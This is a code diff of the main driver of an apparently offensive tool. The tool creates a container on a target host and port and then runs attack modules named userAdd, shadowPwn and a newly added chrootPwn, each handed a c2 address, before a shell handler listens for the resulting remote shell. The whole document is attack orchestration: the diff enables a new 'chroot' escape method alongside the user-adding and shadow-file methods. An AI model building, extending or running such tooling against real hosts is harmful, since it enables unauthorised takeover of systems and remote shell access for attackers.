@@ -15,10 +15,9 @@ import argparse
 import sys
 import createContainer
 import shadowPwn
-import useradd
+import chrootPwn
+import userAdd
 import shellHandler
-from subprocess import Popen
-import threading
 
 def main():
 
@@ -39,19 +38,20 @@ def main():
         
         if image is None:
             image = 'alpine'
-
-        containerID = createContainer.create(target, port, image)
         
+        containerID = createContainer.create(target, port, image)
+
         if method is None or method == 'useradd':
-            useradd.attack(target, port, containerID, c2)
+            userAdd.attack(target, port, containerID, c2)
             shellHandler.listen(c2, method)
 
         elif method == 'shadow':
             shadowPwn.attack(target, port, containerID, c2)
             shellHandler.listen(c2, method)
 
-       # elif method == 'chroot':
-            #binPwn.attack(target, port, containerID)
+        elif method == 'chroot':
+            chrootPwn.attack(target, port, containerID, c2)
+            shellHandler.listen(c2, method)
 
     else:
         print("[!] You must specify a target and port. Exiting.")
